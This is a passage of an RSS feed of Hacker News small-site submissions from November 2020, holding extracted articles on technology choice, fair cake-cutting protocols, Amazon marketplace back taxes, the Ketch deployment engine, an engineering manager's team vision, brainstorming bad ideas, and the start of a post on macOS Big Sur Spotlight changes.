        </a>        <a title="How can you avoid feeling that your work is insignificant?" href="https://smashnotes.com/p/the-startup-chat-with-steli-and-hiten/e/456-the-fear-of-doing-something-insignificant/s/how-can-you-avoid-feeling-that-your-work-is-insignificant">
          <div>
            <div>
            
            <div>
            <p>How can you avoid feeling that your work is insignificant</p>
            <p>To avoid feeling like you are not doing enough you have to first define wha ...</p>
            </div>
            </div>
          </div>
        </a>
  </div></div>]]>
            </description>
            <link>https://smashnotes.com/p/below-the-line-with-james-beshara/e/3-eric-ries-psychological-journey/s/what-is-one-untold-truth-about-genius-in-silicon-valley</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073827</guid>
            <pubDate>Thu, 12 Nov 2020 19:28:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Magpie Developers and Their Opposites]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073821">thread link</a>) | @deltamidway
<br/>
November 12, 2020 | https://www.neomindlabs.com/post/magpie-developers-their-opposites | <a href="https://web.archive.org/web/*/https://www.neomindlabs.com/post/magpie-developers-their-opposites">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><blockquote>“I’ve often thought that software developers were akin to Magpies, birds notorious for stealing shiny items to decorate their complex nests. Like Magpies, software developers are unusually smart and curious creatures, almost by definition. But we are too easily distracted by shiny new toys and playthings.”</blockquote><p>—<a href="https://blog.codinghorror.com/the-magpie-developer/" target="_blank">Jeff Atwood</a>, co-founder of Stack Overflow</p><p>I think many developers ignore this observation because “Taking this reasoning to its reduction ad absurdum would mean picking Java and then trying to implement a website without using anything else at all. That would be crazy. You need some means to add things to your toolbox.” </p><p>”It is basically always the case that the long-term costs of keeping a system working reliably vastly exceed any inconveniences you encounter while building it.” —<a href="https://mcfunley.com/" target="_blank">Dan McKinley</a></p><p>We all know someone who jumped from tool to tool and eventually settled somewhere. Whether it’s Java, PHP, Cobol, or (in the case of Neomind) Ruby, finding tools you love to solve a particular problem and sticking with them can lead to a depth of understanding familiarity that completely changes the game. I believe this happens to developers when they get tired of the endless churn of new technologies, and as they start to care more about maintainability.</p><p>I’m not arguing that Ruby on Rails is the best tool for every job or that it’s so good everyone should stop inventing new things. On the contrary, I love that people are always experimenting, and I love playing with their experiments. <strong>But it would be unprofessional and irresponsible to use every shiny new thing on the types of long-lived assets most people are building.</strong></p><p>Why is it unprofessional and irresponsible to use shiny new technology?</p><p>Many new tools and frameworks implement sweeping changes after their initial versions, making the upgrade path virtually a rewrite from scratch. A new fad replaces others and fizzles out. Marketing sites, special seasonal initiatives, or one-off applications that serve a limited need have lifespans measured in months. On projects like these, longevity and maintainability don’t play a role in the decision-making process, and developers are free to experiment with whatever new tech they choose.</p><p>Most of the projects we see have lifespans measured in years, and yet what is the decision-making process for choosing the platform? Projects governed by the tech-fashion-trend of the day.</p><figure><p><img src="https://assets.website-files.com/5e5ae68f66194f4c868f9602/5f9b5d76c4bf1ca576e16a61_lolz-meme.jpg" loading="lazy" alt="unlambda meme"></p></figure><p>Using new/unproven technologies on projects like these would be an irresponsible waste of other people’s money. Failing to consider the lifespan and maintenance needs of the project when choosing a framework would be nothing short of unprofessional (and as someone who uses Zoolander memes in his blogposts, I know a thing or two about professionalism). Yet, many developers make their technology choices purely from what will be the most fun for them. Bored developers find a little “Resume Driven Development” hard to resist.</p><p>Even worse, many managers <em>allow</em> this kind of decision-making to “keep the developers happy” and hopefully reduce turnover costs. Many times, the developers only stay a little longer, and there’s a trail of disjointed, unrelated, hard-to-maintain experiments left in their wake.</p><p>Choosing a framework whose longevity and maturity reflect your application’s likely lifespan and needs is an important consideration. There are no guarantees, but choosing an immature platform with a small or disengaged community can be a costly, unprofessional mistake.</p><p>“Mindful choice of technology gives engineering minds real freedom: the freedom to contemplate bigger questions. Technology for its own sake is snake oil.” Also<a href="https://mcfunley.com/" target="_blank"> Dan McKinley</a>.</p><p>‍</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.neomindlabs.com/post/magpie-developers-their-opposites</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073821</guid>
            <pubDate>Thu, 12 Nov 2020 19:27:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FairDivision]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073516">thread link</a>) | @wooby
<br/>
November 12, 2020 | https://tailrecursion.com/~alan/FairDivision.html | <a href="https://web.archive.org/web/*/https://tailrecursion.com/~alan/FairDivision.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>
Created Monday 09 November 2020
</p>

<h2>I cut, you choose</h2>



<p>
The "<a href="https://en.wikipedia.org/wiki/Divide_and_choose" title="I cut, you choose">I cut, you choose</a>" method of dividing something fairly between two people is well known. Given some divisible resource, like a pizza, two people may divide the resource using the following protocol:
</p>

<ol type="1" start="1">
<li>One person is chosen at random to cut the pizza in two pieces.</li>
<li>The person who did not cut takes a piece.</li>
<li>The person who cut takes the remaining piece.</li>
</ol>


<p>
This protocol is easy to remember and to explain. It is also efficient in the sense that the minimal number of pieces — two — are created.
</p>

<p>
If you haven't before, I encourage you to now take a moment to consider how a resource could be divided fairly between any number people, not just two.
</p>

<p>
I thought about this recently myself when I needed to divide a large cookie between myself, my wife, and our 4-year-old daughter. I excused myself to think about how to proceed. When I returned, the cookie had been eaten! That's one protocol I <i>don't</i> recommend.
</p>

<h2>The Fink protocol</h2>



<p>
Later (and after eating an entire large cookie without even telling my family about it) I sat down to research the problem. I consulted with my friend Micha Niskin and he suggested the following technique he had devised, which I discovered later is known as the <a href="https://en.wikipedia.org/wiki/Fink_protocol" title="Fink protocol:">Fink protocol:</a>
</p>

<ol type="1" start="1">
<li>If there are two people, perform "I cut, you choose".</li>
<li>If there are three people, two are chosen randomly. The two randomly chosen people perform "I cut, you choose".</li>
<li>The two people with a piece each cut their piece into thirds.</li>
<li>The third person without any pieces yet chooses one piece from each of the two with pieces.</li>
<li>All people now have two pieces each.</li>
<li>If a fourth person joins, each of the three with pieces cut each of their pieces in two.</li>
<li>The fourth person without any pieces yet chooses one piece from each of the three with pieces.</li>
<li>All people now have three pieces each.</li>
<li>...and so on.</li>
</ol>


<p>
The biggest drawback of the Fink protocol is that each person ends up with n-1 pieces, where n is the number of people, instead of a single piece of size 1/n. On the other hand, like "I cut, you choose", this protocol is easy to remember, and is almost as easy to explain, even to children.
</p>

<p>
There are actually many approaches to problem, all with various tradeoffs. I didn't find any of them nearly as easy to remember or explain (especially to <i>hungry</i> children!) as Fink, but if you want to do your own research, <a href="https://en.wikipedia.org/wiki/Fair_cake-cutting" title="Fair cake-cutting on Wikipedia">Fair cake-cutting on Wikipedia</a> is where I started.
</p>

	</div></div>]]>
            </description>
            <link>https://tailrecursion.com/~alan/FairDivision.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073516</guid>
            <pubDate>Thu, 12 Nov 2020 19:04:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[States go after Amazon merchants-and sometimes Amazon-for millions in back taxes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073467">thread link</a>) | @rhinoh
<br/>
November 12, 2020 | https://www.route-fifty.com/finance/2020/11/states-small-businesses-amazon-millions-back-sales-taxes/169999/ | <a href="https://web.archive.org/web/*/https://www.route-fifty.com/finance/2020/11/states-small-businesses-amazon-millions-back-sales-taxes/169999/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

    <div>

      <div>
        

        
          
        

        
  
    <div>
      


<div>
  
  <p>Connecting state and local government leaders</p>
</div>

    </div>
  


        
          

          
        

      </div>

      
      <div>

        <div>
          
          <p>
            
              
                
                  



  By


<span><span>
        Liz Farmer
      </span></span>

                
              
            
          </p>

          
            <p><span>|</span>
          

          
            <time datetime="2020-11-12T17:57:00+00:00">
             November 12, 2020
            </time>
          
        </p></div>

        
          <h2>The Supreme Court in 2018 gave states the power to make new rules for collecting sales taxes online. But back taxes on products sold by small businesses on Amazon’s marketplace are still a major point of dispute.  </h2>
        

        
  <ul>
    
      <li>
        <a href="https://www.route-fifty.com/topic/taxes/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                Taxes
              </span>
            </span>
          </span>
        </a>
      </li>
    
      <li>
        <a href="https://www.route-fifty.com/topic/state-government/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                State Government
              </span>
            </span>
          </span>
        </a>
      </li>
    
      <li>
        <a href="https://www.route-fifty.com/topic/small-businesses/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                Small Businesses
              </span>
            </span>
          </span>
        </a>
      </li>
    
      <li>
        <a href="https://www.route-fifty.com/topic/california/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                California
              </span>
            </span>
          </span>
        </a>
      </li>
    
      <li>
        <a href="https://www.route-fifty.com/topic/south-carolina/?oref=rf-article-topics">
          <span>
            <span>
              <span>
                South Carolina
              </span>
            </span>
          </span>
        </a>
      </li>
    
  </ul>


        





        

      </div>
      

    </div>
  </div><div>
<div>

<div>
<p>Amazon is one of the nation’s largest retailers in part because of its rapidly growing online marketplace, which allows small business owners to sell their products to a vastly larger group of consumers. In fact, Amazon’s marketplace sales more than doubled in just three years, climbing to <a href="https://www.statista.com/statistics/882919/amazon-marketplace-sales-usa/" target="_blank">about $230 billion in 2019</a><u>, </u>accounting for more than half of the online giant’s business.</p><p>But up until last year, many of those sales weren’t taxed because the legal requirement to do so was murky. Now, some state governments are trying to recoup those taxes. But whether they’re going after Amazon or small business owners themselves for that money depends upon the state.</p><p>In California, a state agency is trying to collect back taxes from Fulfilled-By-Amazon (FBA) sellers from as far back as 2012, when Amazon first opened warehouses and fulfillment centers there.</p><p>Earlier this year, Philadelphia-based FBA seller Brian Freifelder received a notice from the California Department of Tax &amp; Fee Administration (CDTFA) warning that he could owe California up to $1.6 million in back sales tax, plus penalties and interest. (After the story made national news, the CDTFA admitted the $1.6 million estimate was “<a href="https://www.sacbee.com/news/politics-government/capitol-alert/article237036689.html" target="_blank">higher than it should have been</a><u>,</u>” but did not let Freifelder off the hook.)</p><p>The CDTFA argues that a business owner’s inventory stored for sale in California amounts to having a physical presence there, and therefore triggered the eligibility for those sales to be taxed. The action by the agency has sparked at least two lawsuits, the <a href="https://aboutblaw.com/Paf" target="_blank">most recent one</a> filed in September by the trade organization Online Merchants Guild. The guild, which represents FBA sellers, says those sales taxes should have been collected by Amazon in the first place because Amazon was the retailer. In the marketplace format, it argues, merchants are the equivalent of suppliers because they don’t have control over where their products are shipped or sold.</p><p>“They [the CDTFA] have no more discretion to go after Amazon sellers than they do Black &amp; Decker for their sales within Home Depot,” said Paul Rafelson, executive director of the guild.</p><p>But California isn’t alone in trying to directly collect from sellers, with Massachusetts, Minnesota, Washington and Wisconsin also sending demands for back taxes in recent years.</p><p>In South Carolina, however, the state is targeting Amazon itself. It <a href="https://www.realclearmarkets.com/articles/2020/01/24/south_carolina_overreaches_in_its_attempt_to_grab_more_amazon_dollars_104053.html#:~:text=Now%2C%20South%20Carolina%20is%20trying,and%20it%20has%20a%20case." target="_blank">sued the company for $12.5 million</a> in unpaid sales tax, interest, and penalties for the first quarter of 2016 alone. An administrative law judge sided with South Carolina, but that ruling is under appeal. The state says Amazon is liable for remitting sales tax for third-party marketplace sales because customers are using Amazon’s website and fulfillment services for the purchase.</p><p>Amazon <a href="https://d18rn0p25nwr6d.cloudfront.net/CIK-0001018724/96cf5724-d8f6-41ee-b7e0-cf5791ad7de2.pdf" target="_blank">said last year</a> the ruling was without merit and hinted at the scale of the potential financial hit if other states followed this tack. “If South Carolina or other states were successfully to seek additional adjustments of a similar nature, we could be subject to significant additional tax liabilities.”</p><p>Most states sought to clarify the responsibility for collecting taxes after the landmark 2018 Supreme Court ruling that allowed states to collect sales taxes from online sellers, no matter where those merchants are located. In enacting their own sales tax laws, many governments made a distinction between businesses doing direct sales to in-state consumers and those done via online marketplaces such as Amazon or Ebay.</p><p>These marketplace facilitator laws, which have been passed in<a href="https://btfgatsby.revivedesignstudios.com/blog/random-awesomeness/soapbox/roundup-marketplace-facilitator-laws-enacted-in-33-states-via-tax-notes-nexus-tracker/#:~:text=The%2033%20states%20that%20have,Oklahoma%2C%20Pennsylvania%2C%20Rhode%20Island%2C" target="_blank"> 33 of the 45 sales tax states</a>, make clear that the marketplace platform is responsible for collecting sales taxes—not the merchant who is providing the product. The intent was to keep in place protections for small business owners for whom it may be cost prohibitive to comply with dozens of different sales tax laws. For example, California’s law that took effect in 2019 says that remote retailers must register to collect and remit sales tax once their annual sales into the state exceed $500,000.</p><p>But far from clearing things up, those facilitator laws have in some cases added to the confusion. In California, State Treasurer Fiona Ma <a href="https://onlinemerchantsguild.org/wp-content/uploads/2019/03/Letter-to-Governor-Newsom.pdf" target="_blank">criticized the CDFTA’s approach</a>, calling it “a wrong-headed and retroactive administration of the state’s tax law.” She argued in a letter to Gov. Gavin Newsom that the state’s policy was unfair to small businesses without the ability to comply, while possibly forcing them out of business. Since then, the legislature passed another law that limited the state’s look-back period to 2016 for collecting marketplace sales taxes, but&nbsp; that still targets sellers.</p><p>Scott Peterson, Avalara’s vice president of U.S. tax policy, said that state legislatures can &nbsp;potentially step in to protect marketplace sellers from past tax liability. But in California, that ship has likely sailed.</p><p>“They could have let the past be the past,” he said. “But instead they doubled down.”<svg>
<use xlink:href="/static/b/base/svg/spritesheet.svg#icon-rf-shield-alt"></use>
</svg></p></div></div>
</div></div>]]>
            </description>
            <link>https://www.route-fifty.com/finance/2020/11/states-small-businesses-amazon-millions-back-sales-taxes/169999/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073467</guid>
            <pubDate>Thu, 12 Nov 2020 19:01:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shipa Open Sources Ketch]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25073458">thread link</a>) | @129jdsf
<br/>
November 12, 2020 | https://www.tfir.io/shipa-open-sources-ketch/ | <a href="https://web.archive.org/web/*/https://www.tfir.io/shipa-open-sources-ketch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                                                
                                                                        <p><a href="https://www.shipa.io/">Shipa</a> is open sourcing <a href="http://theketch.io/">Ketch</a>, Shipa’s deployment engine, under Apache License Version 2.0. This open source release follows the <a href="https://www.globenewswire.com/news-release/2020/10/08/2105531/0/en/Shipa-Launches-with-Unique-Solution-for-Developing-Deploying-and-Managing-Cloud-Native-Applications-No-Kubernetes-Expertise-Necessary.html">general availability launch</a> of Shipa’s full application management framework in October.</p>
<p>Using Ketch, application developers can manage the entire deployment process at the application level. Developers can stay focused on writing code and do not need any Kubernetes expertise to deploy applications running on Kubernetes.</p>
<p>As a result, teams can accelerate the time needed to adopt Kubernetes, while simultaneously increasing their pipeline’s resilience and reducing the compounding risk with each new deployment.</p>
<p>Ketch reduces the number of Kubernetes objects that developers must learn and maintain in order to leverage Kubernetes best practices for managing applications. The deployment engine does this by generating all Kubernetes-related objects that are required to run applications on Kubernetes – automatically and directly from their application code.</p>
<p>Ketch also enables developers to generate Helm charts directly from the application code, allowing them to fully customize ingress, services, security, resources and more before deployment. Developers can also use their existing container images, in which case Ketch creates and deploys all necessary objects for the application to run.</p>
<p>Ketch offers connections into existing clusters (beginning with Kubernetes 1.14+) and improves the developer experience and application delivery speed by fitting into developers’ existing stack.</p>
<p>Shipa is a Silver member of the Cloud Native Computing Foundation and a General member within the Continuous Delivery Foundation.</p>
<p>Shipa is funded by Engineering Capital and Jump Capital; advisors include Google’s Kelsey Hightower, Mastercard’s Ken Owens, and Lyft’s Matt Klein.</p>

<!-- AI CONTENT END 1 -->
    							</div></div>]]>
            </description>
            <link>https://www.tfir.io/shipa-open-sources-ketch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073458</guid>
            <pubDate>Thu, 12 Nov 2020 18:59:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Vision for Our Work Together (Statement from a New Engineering Manager)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073285">thread link</a>) | @ninjakeyboard
<br/>
November 12, 2020 | https://multiplexedmusings.com/2020/11/08/my-vision-for-our-work-together/ | <a href="https://web.archive.org/web/*/https://multiplexedmusings.com/2020/11/08/my-vision-for-our-work-together/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrap">

	<!-- BEGIN #header -->
	

<!-- BEGIN .container -->
<div>

	<!-- BEGIN .row -->
	<div>

		<!-- BEGIN .twelve columns -->
		<div>
	        <!-- BEGIN .postarea -->
<div>

	
	

	
	
<p>(This is a living document and will change and evolve over time. I’m writing this for my new team so that we may develop a vision together.)</p>



<p>This article outlines what I want us to accomplish together, and how I think we can get there. I want us to have a tremendous impact on the organization. I want us to lead by example, both as a team, and as individuals. I want our team to be seen as the very best. And I want us to get there by being our truest and most authentic selves. I want us to enjoy the journey together and to believe in what we’re doing. </p>



<p><strong>On moving into the future: </strong>Ours is an older tech company with a long history. I remember us in the 90s. I never want us to feel burdened by where we came from. I never want us to do things because it’s the way that they’ve always been done. I want us to incorporate all of our learnings and experience to find a new and better way for tomorrow while meeting the demands of today. I want us to learn from all of our past mistakes, and to not make them again. I want to look at modern approaches, tools, and technologies, and find the way that makes sense for us as humans to adopt, borrow, and be inspired with them while understanding that technology and practices are tools and that there is no best tool to use, but only the best tools for the problems AND for the people solving the problems. We should always consider the people and the solutions together, knowing that we have to support and build tomorrow on what we create today.</p>



<p><strong>On relationships:</strong> I’ve been through a lot. I know we all have. Life has been hard. Very often we show a shiny veneer of strength and stability. Our inner worlds can be much more tumultuous. I want us to connect as humans, not as co-workers and employees. I want you to feel safe knowing you will have some bad days. I want to give you my trust, knowing that you want to do your best and I want your trust knowing that I will do my best. I want you to feel protected when something goes wrong or when you make a mistake. I want you know that you can be honest with me and that I’ll do my best to protect you in those challenging moments.</p>



<p><strong>On psychological safety: </strong>I commit to making you feel safe, protected, understood, healthy and cared-for. I commit to doing this to the very best of my ability. I commit to working tirelessly to get us there.</p>



<p><strong>On communication:</strong> sometimes we may feel that we say things because it’s the right thing to say in a group (this is called <strong>“Groupthink”</strong>). Even if it’s not what we really believe, we may feel that it’s easier to say what people want to hear. <strong>I do not want us to do that. </strong>I want us to identify “Groupthink” and to stop it in its tracks. I want to <strong>encourage dissent</strong>. I want you to have strong opinions and to voice them. But I want us to <strong>hold our strong opinions loosely</strong>, so that we may come together, hear each other and be heard. I want to find the right way forward with honest agreement. If we cannot change opinions to meet our own, we must find the truth in other people’s opinions until we truly believe that it is the way forward. Or we must find a solution that’s better than any of the opinions on the table that everyone feels good with. I commit to you to never demand we move in a direction. <strong>I commit to you that I will encourage your dissent, do my best to understand your opinion, and find a way forward where everyone feels heard, understood, and in agreement.</strong></p>



<p><strong>On reward:</strong> We are all unique.<strong> Intrinsic motivators</strong> differ for each of us. I vow to connect with you as a human individual and to understand what really drives you. For some of us it is learning and personal growth. For some it is acknowledgement and recognition. For some it is seeing the reality and impact of the work that we do. We are motivated by all of these in some degree in different ways and at different times. I vow to give you the opportunities that you desire. I will devote myself to helping you grow and shine and make a difference in the world around you. I never want to reward you for something different than what we really want as a team (<strong>“Rewarding X but Hoping for Y”</strong>.) And I promise to do my best to work with you to ensure you are getting you what you need to connect with the work that you do, to have fun and feel good about it.</p>



<p><strong>On measurement: </strong>What we are measured on is what we deliver on. I commit to measure you to show your strength and contribution. I commit to working to ensure others see this as well. I’ve seen people contribute great value but barely be recognized for their work – I commit to showing your contributions and ensuring your work is celebrated.</p>



<p>This is my vision for us as a team. How we get there will be up to us to discover. It will be an iterative process, and we must communicate and revisit the vision and ensure our strategies align and grow to meet this.</p>

	
	<!-- BEGIN .postmeta -->
	

	<!-- .post-navigation -->

	
<!-- #comments -->

	

	
<!-- END .postarea -->
</div>		</div><!-- END .twelve columns -->

	</div><!-- END .row -->

</div><!-- END .container -->





<!-- BEGIN #footer -->


<!-- END #wrap -->
</div></div>]]>
            </description>
            <link>https://multiplexedmusings.com/2020/11/08/my-vision-for-our-work-together/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073285</guid>
            <pubDate>Thu, 12 Nov 2020 18:48:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Problem of Twelve: Interactive Dashboard]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073236">thread link</a>) | @greatwave1
<br/>
November 12, 2020 | https://www.quiverquant.com/sources/sharedownership?c= | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/sources/sharedownership?c=">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.quiverquant.com/sources/sharedownership?c=</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073236</guid>
            <pubDate>Thu, 12 Nov 2020 18:45:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Worst Possible Solution]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25073063">thread link</a>) | @lucaronin
<br/>
November 12, 2020 | https://refactoring.fm/p/the-worst-possible-solution- | <a href="https://web.archive.org/web/*/https://refactoring.fm/p/the-worst-possible-solution-">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A few months ago I attended a <a href="http://designleadership.clinic/">Design Leadership program</a>. I enjoyed it thoroughly, as <a href="https://www.designleadership.clinic/pageus">Duane and Stefane</a> discussed their methodology to turn "design-thinking" into "design-doing".</p><p>Towards the end of the course, we talked of <em>Brainstorming</em>.</p><h3>🧠 Brainstorming</h3><p>In a Design workflow, Brainstorming belongs to the <em>Ideation</em> phase, that is, the moment you produce an output based on requirements provided by the <a href="https://en.wikipedia.org/wiki/Design_brief">Brief</a>.</p><p>Its principles, though, make it useful in any context where you have to converge, as a group, on some creative decision — like Product / Engineering strategy, or company-wide settings like OKR planning.</p><p>At its core, Brainstorming is a session that involves a group of stakeholders, bringing diverse perspectives to the table, with the goal of producing a good output that is participated by the whole group.</p><p>Here, the output being <em>participated</em> is just as important as it being <em>good —</em> more so, sometimes <em>good</em> and <em>participated</em> actually mean the same thing.</p><h3>🤝 Converging</h3><p>If we take a product perspective, converging on what to do next is often a long and painful process, especially when several stakeholders are involved. To do it right, it requires a good amount of iteration — as shown, for instance, in the great <a href="https://firstround.com/review/the-secret-to-a-great-planning-process-lessons-from-airbnb-and-eventbrite/">W Framework</a> from Airbnb and Evenbrite.</p><p>The problem with converging is that people come from different starting points. That is, they have different <em>values</em> about what's good and bad.</p><p>To make things harder, where people stand in terms of such values is often unclear at the beginning. In order to come to an output, these values should be progressively surfaced and inform the group's decisions.</p><h3>💩 What's the <em>worst solution</em> for this?</h3><p>Now, I believe we are all used to brainstorming the <em>best </em>possible solutions for problems. What a few people do, however, is trying to think at the <em>worst</em> ones as well.</p><p>In particular, let's take a problem and think of two classes of solutions:</p><ol><li><p>👍 <strong>The Best Solutions</strong> — those that look the most promising to participants.</p></li><li><p>👎 <strong>The Worst Solutions</strong> — those that either make the problem worse, or solve it at the expense of creating much bigger ones.</p></li></ol><p>As an example, during the program we analyzed the pain of 🚗 <strong>traffic congestion</strong> in cities, and came up, among others, with the following solutions:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8913a109-2f02-4bdc-8e3c-469107eb09cb_2004x1584.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8913a109-2f02-4bdc-8e3c-469107eb09cb_2004x1584.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/8913a109-2f02-4bdc-8e3c-469107eb09cb_2004x1584.png&quot;,&quot;height&quot;:1151,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:299103,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>During the discussion, it turns out the worst solutions provided as many insights as the best ones. They attacked the problem from unexpected sides and contributed significantly to our progress as a group.</p><p>Brainstorming bad ideas, in fact, exposes people's values about what's bad, and that's as much as useful as exposing what's good. Because the faster the two extremes are surfaced and understood, the easier is for the group to converge.</p><h3>🗯 Controversial ideas and Startups</h3><p>You also get to see something peculiar: some bad ideas are surprisingly similar, or related somehow, to the good ones.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd8773d1c-2c3b-4fff-9ddd-c76e4017433b_1934x1324.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd8773d1c-2c3b-4fff-9ddd-c76e4017433b_1934x1324.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d8773d1c-2c3b-4fff-9ddd-c76e4017433b_1934x1324.png&quot;,&quot;height&quot;:997,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:274218,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>In our traffic congestion case, you see <em>more taxi</em> among the worst ones, and <em>car sharing</em> among the best. If you think about it, they are not so different: they are both about replacing private cars with some kind of shared vehicles.</p><p>The fact that they appear in the two extremes suggests that there is some controversy about an underlying theme. In this case, it might be <em>car ownership</em>.</p><p>Controversy is powerful because some of the very best ideas are born out of it. Quoting <a href="http://www.paulgraham.com/swan.html">Paul Graham</a>, the best Startup ideas live at the intersection of <em>looking bad</em> and <em>actually being good:</em></p><blockquote><p><em>The first time Peter Thiel spoke at YC he drew a Venn diagram that illustrates the situation perfectly. He drew two intersecting circles, one labelled "seems like a bad idea" and the other "is a good idea". The intersection is the sweet spot for startups.</em></p><p><em>This concept is a simple one and yet seeing it as a Venn diagram is illuminating. It reminds you that there is an intersection — that there are good ideas that seem bad. It also reminds you that the vast majority of ideas that seem bad are bad.</em></p></blockquote><h3>📚 Takeaway</h3><p>In my experience, brainstorming both good and bad ideas surfaces the full spectrum of people's values. This is more useful than just thinking of the good ones, and makes a group converge on a solution faster and with more confidence.</p><p>You can try it out the next time you discuss a problem for which the solution is unclear and should be participated by multiple stakeholders 🙌</p><p><strong>Do you follow any formal process to produce new ideas in your team? Be them about  product, engineering or any other function. If yes, how does it work? I am curious to discuss it in the comments or via email</strong> 👇</p><p><em>Hey, I am Luca 👋 thank you for reading this through!</em></p><p><em>Every week I publish something about making software, working with people and personal growth. If you haven’t already, you can subscribe below to receive new posts in your inbox!</em></p></div></div>]]>
            </description>
            <link>https://refactoring.fm/p/the-worst-possible-solution-</link>
            <guid isPermaLink="false">hacker-news-small-sites-25073063</guid>
            <pubDate>Thu, 12 Nov 2020 18:34:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotlight changes in macOS 11 Big Sur]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072845">thread link</a>) | @brandonhorst
<br/>
November 12, 2020 | https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur.html | <a href="https://web.archive.org/web/*/https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>macOS 11 Big Sur changed Spotlight to bring it more in line with iPadOS search. These changes are intended to simplify things, but they create inconsistencies that may be confusing both to newcomers and to long-time users.</p>

<p>Ultimately, there are three interconnected changes: <a href="#spotlight-11-hidden-previews">hidden previews</a>, <a href="#spotlight-11-disclosure-indicators">disclosure indicators</a>, and <a href="#spotlight-11-suggestions">suggestions</a>. This post will analyze the changes and provide <a href="#spotlight-11-recommendations">recommendations</a> to help frustrated users.</p>

<p>Of course, I believe that <a href="https://lacona.app/">Lacona</a> is an alternative to Spotlight that is both more usable and more powerful, but I won’t be making comparisons to Lacona in this analysis.</p>



<p>Just as before, you call up Spotlight by pressing <code>⌘+Space</code>, or by clicking the magnifying glass icon in the menu bar. However, things change once you start typing.</p>

<p>In macOS X, Spotlight showed your <em>search results</em> in a list on the left side, with a <em>preview</em> on the right side. In Big Sur, the search results are presented in a single list, with no visible preview.</p>

<p><img src="https://lacona.app/img/posts/spotlight-1.png" alt="Spotlight &quot;app&quot; screenshot"></p>

<p>These previews—which were originally introduced as a headlining feature of macOS 10.10 Yosemite—are not actually gone, just hidden. Clicking on a result, or pressing <code>Tab</code> will show the preview.</p>

